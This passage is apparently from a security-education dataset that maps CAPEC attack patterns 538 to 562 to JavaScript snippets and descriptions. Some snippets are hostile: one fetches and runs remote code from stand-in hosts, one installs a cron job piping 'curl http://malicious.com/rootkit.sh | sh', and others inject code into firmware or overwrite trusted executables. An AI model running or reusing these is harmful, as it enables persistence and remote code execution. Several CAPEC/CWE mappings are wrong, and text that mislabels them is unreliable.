        "code_snippet": "const fs = require('fs');\n\n// CWE-506: Embedded Malicious Code\nfunction injectMaliciousCode(filePath) {\n  const maliciousCode = `\n    // Malicious code injected\n    console.log('Sensitive data exfiltrated');\n    // CWE-497: Exposure of Sensitive System Information\n    const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n    console.log(sensitiveData);\n  `;\n\n  // CWE-1297: Unprotected Confidential Information on Device\n  if (fs.existsSync(filePath)) {\n    let fileContent = fs.readFileSync(filePath, 'utf8');\n    fileContent += maliciousCode;\n    fs.writeFileSync(filePath, fileContent, 'utf8');\n  }\n}\n\n// Example usage\ninjectMaliciousCode('/path/to/firmware.js');",
        "description": "This JavaScript code snippet demonstrates the infiltration of a hardware development environment by injecting malicious code into a firmware file. The `injectMaliciousCode` function appends a block of malicious code to an existing file. This malicious code reads and logs sensitive data from a specified path, representing CWE-497 (Exposure of Sensitive System Information). The function checks if the file exists before modifying it, highlighting CWE-1297 (Unprotected Confidential Information on Device). The overall concept aligns with the CAPEC description, where an adversary manipulates the development environment to insert malicious software, potentially compromising the hardware components destined for deployment."
    },
    {
        "capec_id": "538",
        "capec_name": "Open-Source Library Manipulation",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttps.get('https://example.com/malicious-library.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    fs.writeFileSync('malicious-library.js', data);\n    require('./malicious-library.js'); // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n  });\n}).on('error', (err) => {\n  console.error('Error downloading the file:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a malicious library is downloaded and executed without proper integrity checks. The code uses the 'https' module to download a JavaScript file from a remote location (CWE-494). Once downloaded, the file is saved locally and then required into the application (CWE-829). This downloaded file could contain embedded malicious code (CWE-506), which could further compromise the system. This snippet embodies the main idea of the CAPEC by showing how an adversary could implant malicious code in an open-source library, which is then widely distributed and executed by unsuspecting developers."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC {\n  constructor() {\n    this.securityToken = 'secureToken123'; // CWE-1259: Improper Restriction of Security Token Assignment\n    this.debugMode = true; // CWE-11: ASP.NET Misconfiguration: Creating Debug Binary\n  }\n\n  getSensitiveInfo() {\n    if (this.debugMode) {\n      console.log('Debug Info: Sensitive system information'); // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    }\n    return 'Sensitive system information';\n  }\n\n  maliciousFunction() { // CWE-506: Embedded Malicious Code\n    console.log('Executing malicious functionality');\n    // Malicious code that disrupts or compromises the system\n  }\n\n  insecureSecurityIdentifier() { // CWE-1294: Insecure Security Identifier Mechanism\n    return 'insecureIdentifier';\n  }\n}\n\nconst asic = new ASIC();\nasic.maliciousFunction();\nconsole.log(asic.getSensitiveInfo());\nconsole.log(asic.insecureSecurityIdentifier());",
        "description": "This JavaScript code snippet represents an ASIC (Application-Specific Integrated Circuit) class that embodies the main idea of CAPEC-ASIC With Malicious Functionality. The class includes several vulnerabilities: CWE-1259 (Improper Restriction of Security Token Assignment) by hardcoding a security token, CWE-11 (ASP.NET Misconfiguration: Creating Debug Binary) by enabling debug mode, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by logging sensitive information in debug mode, CWE-506 (Embedded Malicious Code) by including a malicious function, and CWE-1294 (Insecure Security Identifier Mechanism) by returning an insecure identifier. This code demonstrates how an attacker with access to the development environment can insert malicious functionality and expose sensitive information, leading to system disruption or further compromise."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "function readBuffer(buffer, index) {\n  if (index < 0 || index >= buffer.length) {\n    console.log('Index out of bounds');\n    return;\n  }\n  return buffer[index];\n}\n\nconst buffer = [1, 2, 3, 4, 5];\nconst index = 10; // Out-of-bounds index\nconsole.log(readBuffer(buffer, index));",
        "description": "This JavaScript code snippet demonstrates a potential buffer over-read vulnerability. The function `readBuffer` attempts to read an element from the `buffer` array at a specified `index`. If the `index` is out of the valid range (less than 0 or greater than or equal to the buffer's length), it logs an 'Index out of bounds' message and returns. However, if the index check is removed or bypassed, the function could attempt to read memory outside the buffer's bounds, leading to undefined behavior, potential exposure of sensitive information, or a crash. This snippet embodies the main idea of CAPEC-129: Overread Buffers, and relates to CWEs such as CWE-125 (Out-of-bounds Read) and CWE-126 (Buffer Over-read)."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/version') {\n    // Observable Response Discrepancy\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Application Version: 1.0.0');\n  } else if (req.url === '/status') {\n    // Observable Behavioral Discrepancy\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Application Status: Running');\n  } else {\n    // Observable Timing Discrepancy\n    setTimeout(() => {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('Not Found');\n    }, 1000); // Intentional delay to reveal information\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens for incoming requests. It demonstrates the concept of 'Application Fingerprinting' by providing different responses based on the requested URL. The '/version' endpoint reveals the application version, showcasing an Observable Response Discrepancy (CWE-204). The '/status' endpoint reveals the application's running status, demonstrating an Observable Behavioral Discrepancy (CWE-205). For any other URL, the server introduces a delay before responding with a 404 status, illustrating an Observable Timing Discrepancy (CWE-208). These discrepancies can be exploited by an adversary to fingerprint the application and gather information about its internal state and behavior."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\n// Trojan Horse: Malicious code hidden within seemingly benign functionality\nfunction benignFunction() {\n  console.log('This is a benign function.');\n}\n\n// Embedded Malicious Code: Collects sensitive system information\nfunction maliciousFunction() {\n  const sensitiveInfo = {\n    userInfo: os.userInfo(),\n    networkInterfaces: os.networkInterfaces()\n  };\n  // Spyware: Sends collected information to an unauthorized control sphere\n  sendSensitiveInfo(sensitiveInfo);\n}\n\nfunction sendSensitiveInfo(info) {\n  // Simulate sending data to an external server\n  console.log('Sending sensitive information to attacker:', info);\n}\n\n// Replicating Malicious Code: Simulate spreading the malware\nfunction replicateMalware() {\n  console.log('Replicating malware to other systems...');\n  // Code to replicate malware would go here\n}\n\n// Execute the functions\nbenignFunction();\nmaliciousFunction();\nreplicateMalware();",
        "description": "This JavaScript code snippet demonstrates a targeted malware attack that leverages multiple weaknesses. The `benignFunction` represents a Trojan Horse, appearing harmless while hiding malicious intent. The `maliciousFunction` collects sensitive system information (CWE-497) such as user info and network interfaces, simulating spyware behavior (CWE-512). The `sendSensitiveInfo` function represents the unauthorized transmission of this data. Finally, the `replicateMalware` function simulates the replication of the malware to other systems (CWE-509). This code embodies the main idea of CAPEC-506 by illustrating how targeted malware can exploit known vulnerabilities to achieve various malicious outcomes."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.write('<html><body><h1>Welcome to the counterfeit site!</h1></body></html>');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that listens on port 8080. The server checks for a 'redirect' query parameter in the URL. If the parameter is present, it performs an HTTP 302 redirect to the specified URL, which can be exploited for URL Redirection to Untrusted Site (CWE-601). If the parameter is not present, it serves a basic HTML page that mimics a legitimate site, representing the concept of Counterfeit Websites (CAPEC-509). This counterfeit site can be used to gather information or upload malware. The code demonstrates vulnerabilities such as Open Redirect (CWE-601) and the potential for embedding malicious code (CWE-506)."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "const https = require('https');\n\nfunction fetchData(url) {\n  const options = {\n    hostname: 'fake-supplier.com',\n    port: 443,\n    path: '/data',\n    method: 'GET',\n    rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n  };\n\n  const req = https.request(options, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      console.log('Received data:', data);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\nfetchData('https://fake-supplier.com/data');",
        "description": "This JavaScript code snippet demonstrates a scenario where an application fetches data from a counterfeit organization, represented by 'fake-supplier.com'. The code includes CWE-295 (Improper Certificate Validation) by setting 'rejectUnauthorized' to false, allowing the connection to proceed without proper certificate validation. This can lead to the injection of corrupted or malicious components into the supply chain. The code also implicitly touches on CWE-941 (Incorrectly Specified Destination in a Communication Channel) by directing the request to a potentially malicious actor. The main idea of the CAPEC is represented by the creation of a false front organization that injects malicious components into the supply chain."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "const fs = require('fs');\n\n// Function to read sensitive data from a file\nfunction readSensitiveData(filePath) {\n    try {\n        const data = fs.readFileSync(filePath, 'utf8');\n        console.log('Sensitive Data:', data);\n    } catch (err) {\n        console.error('Error reading file:', err);\n    }\n}\n\n// Simulate reading sensitive data from a system resource\nreadSensitiveData('/path/to/sensitive/file.txt');\n\n// Function to simulate improper zeroization of sensitive data\nfunction improperZeroization(buffer) {\n    // Simulate clearing buffer by setting it to null (ineffective)\n    buffer = null;\n    console.log('Buffer after improper zeroization:', buffer);\n}\n\n// Simulate sensitive data in a buffer\nlet sensitiveBuffer = Buffer.from('Sensitive Information');\nimproperZeroization(sensitiveBuffer);\n\n// Simulate reading sensitive data after improper zeroization\nconsole.log('Sensitive Buffer after zeroization:', sensitiveBuffer.toString());",
        "description": "This JavaScript code snippet demonstrates the concept of 'Pull Data from System Resources' (CAPEC) by reading sensitive data from a file and simulating improper zeroization of sensitive data. The `readSensitiveData` function reads and prints the contents of a file, representing the act of pulling data from system resources. The `improperZeroization` function attempts to clear a buffer containing sensitive information by setting it to null, which is ineffective. This simulates CWE-1239 (Improper Zeroization of Hardware Register) and CWE-1330 (Remanent Data Readable after Memory Erase), where sensitive data is not properly cleared and remains accessible. The code highlights the risks associated with improper handling and clearing of sensitive information in system resources."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "const fs = require('fs');\nconst path = '/path/to/multi-tenant/storage';\n\nfunction deleteTenantData(tenantId) {\n  const tenantDataPath = `${path}/${tenantId}`;\n  if (fs.existsSync(tenantDataPath)) {\n    fs.readdirSync(tenantDataPath).forEach(file => {\n      const filePath = `${tenantDataPath}/${file}`;\n      fs.writeFileSync(filePath, ''); // CWE-312: Cleartext Storage of Sensitive Information\n      fs.unlinkSync(filePath); // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n    });\n    fs.rmdirSync(tenantDataPath);\n  }\n}\n\nfunction allocateStorageToNewTenant(newTenantId) {\n  const newTenantDataPath = `${path}/${newTenantId}`;\n  if (!fs.existsSync(newTenantDataPath)) {\n    fs.mkdirSync(newTenantDataPath);\n  }\n  // Potentially CWE-284: Improper Access Control if not properly managed\n}\n\n// Example usage\ndeleteTenantData('tenant123');\nallocateStorageToNewTenant('tenant456');",
        "description": "This JavaScript code snippet demonstrates a scenario where data from a former tenant in a multi-tenant environment is deleted and storage is reallocated to a new tenant. The `deleteTenantData` function attempts to delete the data of a specified tenant by clearing the contents of each file (CWE-312) and then deleting the files (CWE-1266). The `allocateStorageToNewTenant` function creates a new directory for a new tenant, which could lead to improper access control issues (CWE-284) if not managed correctly. This code embodies the main idea of CAPEC-284 by highlighting the risks associated with incomplete data deletion in a multi-tenant environment, potentially allowing new tenants to access residual sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class Device {\n  constructor() {\n    this.data = 'Sensitive Information';\n  }\n\n  destroy() {\n    // CWE-1082: Class Instance Self Destruction Control Element\n    delete this;\n  }\n\n  removeData() {\n    // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n    this.data = null; // Data is set to null but not completely removed\n  }\n\n  // CWE-1087: Class with Virtual Method without a Virtual Destructor\n  virtualMethod() {\n    console.log('This is a virtual method');\n  }\n}\n\n// Simulating physical destruction\nlet device = new Device();\ndevice.removeData();\ndevice.destroy();\n\n// CWE-1300: Improper Protection of Physical Side Channels\n// Simulating a side-channel attack by observing power consumption\nfunction observePowerConsumption() {\n  console.log('Observing power consumption...');\n}\n\nobservePowerConsumption();\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectError() {\n  console.log('Injecting error to degrade redundancy...');\n}\n\ninjectError();",
        "description": "This JavaScript code snippet represents the concept of 'Physical Destruction of Device or Component' by simulating various vulnerabilities that could lead to the physical destruction or degradation of a device. The 'Device' class includes a method to destroy itself (CWE-1082) and a method to remove data that does not completely delete it (CWE-1301). The class also has a virtual method without a virtual destructor (CWE-1087). The code simulates a side-channel attack by observing power consumption (CWE-1300) and an error injection to degrade hardware redundancy (CWE-1334). This snippet demonstrates how various weaknesses can be exploited to physically attack and degrade a device."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "const sensitiveData = 'TopSecretInformation';\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nfunction sendSensitiveData() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/submit', true);\n  xhr.setRequestHeader('Content-Type', 'text/plain');\n  xhr.send(sensitiveData); // Transmitting sensitive data in cleartext\n}\n\n// CWE-922: Insecure Storage of Sensitive Information\nlocalStorage.setItem('sensitiveData', sensitiveData); // Storing sensitive data insecurely\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nfunction shareResource() {\n  const resource = { data: sensitiveData, publicInfo: 'Public Information' };\n  // Sharing resource without removing sensitive information\n  return JSON.stringify(resource);\n}\n\n// CWE-226: Sensitive Information in Resource Not Removed Before Reuse\nfunction reuseResource() {\n  let resource = sensitiveData;\n  // Reusing resource without clearing sensitive information\n  resource = 'NewData';\n  return resource;\n}\n\n// CWE-402: Transmission of Private Resources into a New Sphere\nfunction leakResource() {\n  const privateResource = sensitiveData;\n  // Leaking private resource to an untrusted party\n  return privateResource;\n}\n\nsendSensitiveData();\nlocalStorage.setItem('sensitiveData', sensitiveData);\nconsole.log(shareResource());\nconsole.log(reuseResource());\nconsole.log(leakResource());",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code includes examples of cleartext transmission of sensitive information (CWE-319), insecure storage of sensitive information (CWE-922), improper removal of sensitive information before storage or transfer (CWE-212), sensitive information in resource not removed before reuse (CWE-226), and transmission of private resources into a new sphere (CWE-402). These vulnerabilities can lead to contamination of organizational information systems by exposing sensitive data to unauthorized actors, thereby requiring the system to be taken offline for investigation and mitigation."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://untrusted-source.com/malicious.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('malicious.js', data, (err) => {\n      if (err) throw err;\n      require('./malicious.js'); // Execute the downloaded code\n    });\n  });\n}).on('error', (err) => { console.error('Download failed:', err); });",
        "description": "This JavaScript code snippet demonstrates a scenario where a script downloads and executes code from an untrusted source without performing any integrity checks. The code uses the 'http' module to fetch a JavaScript file from a remote location and the 'fs' module to save it locally. It then immediately requires and executes the downloaded file. This embodies the CAPEC 'Local Execution of Code' by showing how an adversary could introduce malicious code into a system. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded code, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is demonstrated by importing and executing code from an untrusted source, and CWE-506 (Embedded Malicious Code) is implied by the potential malicious nature of the downloaded script."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "const { exec } = require('child_process');\n\n// CWE-284: Improper Access Control\n// CWE-1392: Use of Default Credentials\nconst serviceName = 'MyService';\nconst servicePath = 'C:\\path\\to\\malicious\\service.exe';\nconst defaultCredentials = 'admin:password';\n\n// CWE-1188: Initialization of a Resource with an Insecure Default\nconst registryKey = `HKLM\\SYSTEM\\CurrentControlSet\\Services\\${serviceName}`;\nconst command = `reg add ${registryKey} /v ImagePath /t REG_EXPAND_SZ /d ${servicePath} /f`;\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Service ${serviceName} installed successfully.`);\n});",
        "description": "This JavaScript code snippet demonstrates the installation of a new service on a Windows system by modifying the registry, which is a key idea of the CAPEC 'Install New Service'. The code uses Node.js's 'child_process' module to execute a command that adds a new registry key for a service, pointing to a potentially malicious executable. The service is named 'MyService' and is set to run at startup. The code also highlights several related CWEs: CWE-284 (Improper Access Control) by not restricting who can add the service, CWE-1392 (Use of Default Credentials) by using default credentials, CWE-1188 (Initialization of a Resource with an Insecure Default) by setting insecure defaults, and CWE-520 (.NET Misconfiguration: Use of Impersonation) by potentially running with elevated privileges."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmod('/etc/systemd/system/my-service.service', 0o777, (err) => {\n  if (err) throw err;\n  console.log('Permissions changed to 777');\n\n  // CWE-15: External Control of System or Configuration Setting\n  exec('systemctl enable my-service', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential security vulnerability by modifying an existing service configuration. It first changes the permissions of a service file to 777 (CWE-284: Improper Access Control), allowing any user to read, write, and execute the file. Then, it enables the service using the 'systemctl enable' command (CWE-15: External Control of System or Configuration Setting). This represents the CAPEC concept of 'Modify Existing Service' by showing how improper access control and external control of system settings can lead to security issues."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst exec = require('child_process').exec;\n\nhttp.createServer((req, res) => {\n  if (req.url === '/install') {\n    const maliciousCode = `\n      const fs = require('fs');\n      fs.writeFile('/etc/cron.d/rootkit', '* * * * * root /bin/bash -c \"curl http://malicious.com/rootkit.sh | sh\"', (err) => {\n        if (err) throw err;\n      });\n    `;\n    fs.writeFile('/tmp/malicious.js', maliciousCode, (err) => {\n      if (err) throw err;\n      exec('node /tmp/malicious.js', (error, stdout, stderr) => {\n        if (error) {\n          console.error(`exec error: ${error}`);\n          return;\n        }\n        console.log(`stdout: ${stdout}`);\n        console.error(`stderr: ${stderr}`);\n      });\n    });\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Malicious code installed');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that listens for requests on port 8080. When a request is made to the '/install' endpoint, it writes a piece of malicious code to a temporary file and then executes it. The malicious code creates a cron job that periodically downloads and executes a script from a malicious server, effectively installing a rootkit. This example demonstrates several vulnerabilities: Improper Access Control (CWE-284) by allowing unauthorized installation of malicious code, Embedded Malicious Code (CWE-506) by writing and executing harmful scripts, Trojan Horse (CWE-507) by hiding malicious functionality within seemingly benign code, Exposure of Sensitive System Information (CWE-497) by potentially exposing system-level information, and OS Command Injection (CWE-78) by executing shell commands based on external input."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "function isAdmin() {\n  // Client-side check for admin privileges\n  return localStorage.getItem('userRole') === 'admin';\n}\n\nfunction accessRestrictedArea() {\n  if (isAdmin()) {\n    console.log('Access granted to restricted area.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Simulate an attacker bypassing the client-side check\nlocalStorage.setItem('userRole', 'admin');\naccessRestrictedArea();",
        "description": "This JavaScript code snippet demonstrates a functionality bypass vulnerability by relying on client-side enforcement of server-side security (CWE-602). The `isAdmin` function checks if the user has admin privileges by reading a value from `localStorage`. The `accessRestrictedArea` function grants or denies access based on this check. An attacker can easily bypass this protection by manipulating the `localStorage` value, as shown in the last two lines of the code. This represents the main idea of the CAPEC, where an adversary bypasses intended protections, exploiting improper protection mechanisms and client-side enforcement."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst users = {\n  'admin': 'password123' // CWE-521: Weak Password Requirements\n};\n\nhttp.createServer((req, res) => {\n  const auth = req.headers['authorization'];\n  if (!auth) {\n    res.writeHead(401, {'WWW-Authenticate': 'Basic realm=\"Secure Area\"'});\n    return res.end('Authorization required');\n  }\n\n  const [username, password] = Buffer.from(auth.split(' ')[1], 'base64').toString().split(':');\n  if (users[username] && users[username] === password) { // CWE-308: Use of Single-factor Authentication\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Access granted');\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Access denied');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a basic HTTP server that uses single-factor authentication (CWE-308) with weak password requirements (CWE-521). The server checks for a Basic Authorization header and decodes it to verify the username and password against a hardcoded user list. If the credentials match, access is granted; otherwise, access is denied. This setup is vulnerable to attacks described in the CAPEC, such as using stolen credentials to gain unauthorized access to remote services. The use of weak passwords and single-factor authentication makes it easier for attackers to compromise the system."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to change file extension handler\nfunction replaceFileExtensionHandler(extension, newHandlerPath) {\n  const handlerConfigPath = path.join(__dirname, 'fileHandlers.json');\n  let handlers;\n\n  // Read the current handlers configuration\n  try {\n    handlers = JSON.parse(fs.readFileSync(handlerConfigPath, 'utf8'));\n  } catch (err) {\n    console.error('Error reading handlers configuration:', err);\n    return;\n  }\n\n  // Update the handler for the given extension\n  handlers[extension] = newHandlerPath;\n\n  // Write the updated handlers configuration back to the file\n  try {\n    fs.writeFileSync(handlerConfigPath, JSON.stringify(handlers, null, 2), 'utf8');\n    console.log(`Handler for .${extension} files updated to ${newHandlerPath}`);\n  } catch (err) {\n    console.error('Error writing handlers configuration:', err);\n  }\n}\n\n// Example usage\nreplaceFileExtensionHandler('txt', '/path/to/malicious/program');",
        "description": "This JavaScript code snippet demonstrates how an application might replace the file extension handler for a given file type. The `replaceFileExtensionHandler` function reads a JSON configuration file (`fileHandlers.json`) that maps file extensions to their respective handlers. It then updates the handler for a specified extension to a new handler path, which could be an arbitrary or malicious program. This embodies the CAPEC concept of 'Replace File Extension Handlers' by showing how an attacker could modify the file handler configuration to execute arbitrary code when a file with the specified extension is opened. The code also touches on related CWEs, such as CWE-284 (Improper Access Control) by not restricting access to the configuration file, CWE-73 (External Control of File Name or Path) by allowing user input to influence the handler path, and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) by relying on the file extension to determine behavior."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "const fs = require('fs');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/file', 'utf8', function(err, data) {\n  if (err) {\n    return console.log(err);\n  }\n  console.log(data);\n});\n\n// Schedule a task to run at a later time\nsetTimeout(function() {\n  // This code relies on a runtime component (setTimeout)\n  console.log('Scheduled task executed');\n}, 1000);",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC 'Schedule Software To Run' by scheduling a task to run after a delay using `setTimeout`. It also incorporates CWE-477 by using the deprecated `fs.readFile` function to read a file, suggesting that the code has not been actively reviewed or maintained. Additionally, the reliance on the `setTimeout` function highlights CWE-1101, as the scheduled task depends on the runtime environment to execute. The code reads a file and schedules a task to run after one second, illustrating potential vulnerabilities in using obsolete functions and relying on runtime components."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmod('/path/to/trusted/executable', 0o777, (err) => {\n  if (err) throw err;\n  console.log('Permissions changed');\n\n  // CWE-114: Process Control\n  fs.writeFile('/path/to/trusted/executable', 'malicious code', (err) => {\n    if (err) throw err;\n    console.log('Trusted executable replaced');\n\n    // CWE-78: OS Command Injection\n    exec('/path/to/trusted/executable', (err, stdout, stderr) => {\n      if (err) {\n        console.error(`Execution error: ${err}`);\n        return;\n      }\n      console.log(`Output: ${stdout}`);\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential attack where an adversary exploits improper access control (CWE-284) to change the permissions of a trusted executable, allowing it to be overwritten. The trusted executable is then replaced with malicious code (CWE-114). Finally, the malicious executable is executed, potentially leading to OS command injection (CWE-78). This embodies the CAPEC 'Replace Trusted Executable' by showing how an attacker can replace a trusted executable with a malicious one and execute it."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "const net = require('net');\n\nconst rogueStation = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    console.log('Received data from satellite:', data.toString());\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    let tamperedData = data.toString().replace('original', 'tampered');\n    socket.write(tamperedData);\n  });\n});\n\nrogueStation.listen(1337, '0.0.0.0', () => {\n  console.log('Rogue uplink station listening on port 1337');\n});",
        "description": "This JavaScript code snippet creates a rogue uplink station using the 'net' module to simulate an orbital jamming attack. The rogue station listens for incoming data from a satellite. When data is received, it logs the data (CWE-940: Improper Verification of Source of a Communication Channel) and then modifies the data (CWE-924: Improper Enforcement of Message Integrity During Transmission) before sending it back. This represents the main idea of the CAPEC 'Orbital Jamming' by disrupting the intended transmission and potentially causing communication issues for those within the satellite's footprint."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = {\n  'admin': 'password123', // CWE-522: Insufficiently Protected Credentials\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. The server uses a hardcoded username and password for authentication, which embodies the main idea of CAPEC-Use of Known Domain Credentials. The code is vulnerable to several weaknesses: \n1. CWE-522: The credentials are stored in plaintext within the code, making them insufficiently protected. \n2. CWE-307: There is no mechanism to prevent multiple failed authentication attempts, making it susceptible to brute force attacks. \n3. CWE-308: The authentication mechanism relies on single-factor authentication (username and password). \n4. CWE-309: The primary means of authentication is a password system, which has inherent flaws. \n5. CWE-262 and CWE-263: There is no password aging mechanism in place. \n6. CWE-654: The security decision relies solely on the evaluation of the username and password. \n7. CWE-1273: If the credentials are shared among multiple parties, it could expose sensitive information. This code snippet demonstrates how an adversary could exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "const net = require('net');\nconst fs = require('fs');\n\nconst credentials = { username: 'admin', password: 'password123' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(creds) {\n  // CWE-308: Use of Single-factor Authentication\n  return creds.username === 'admin' && creds.password === 'password123';\n}\n\nfunction accessAdminShare(creds) {\n  if (authenticate(creds)) {\n    // CWE-522: Insufficiently Protected Credentials\n    const client = new net.Socket();\n    client.connect(445, '192.168.1.100', () => {\n      console.log('Connected to admin share');\n      client.write('GET /admin_share HTTP/1.1\\r\\n');\n    });\n    client.on('data', (data) => {\n      console.log('Received: ' + data);\n      client.destroy();\n    });\n    client.on('close', () => {\n      console.log('Connection closed');\n    });\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\naccessAdminShare(credentials);",
        "description": "This JavaScript code snippet demonstrates a simplified scenario where an attacker uses weak and insufficiently protected credentials to access a Windows Admin Share. The credentials are hardcoded (CWE-521) and the authentication mechanism is single-factor (CWE-308). The code attempts to connect to a network share using these credentials, representing the CAPEC scenario of 'Windows Admin Shares with Stolen Credentials'. The use of weak passwords and single-factor authentication makes it easier for an attacker to gain unauthorized access."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
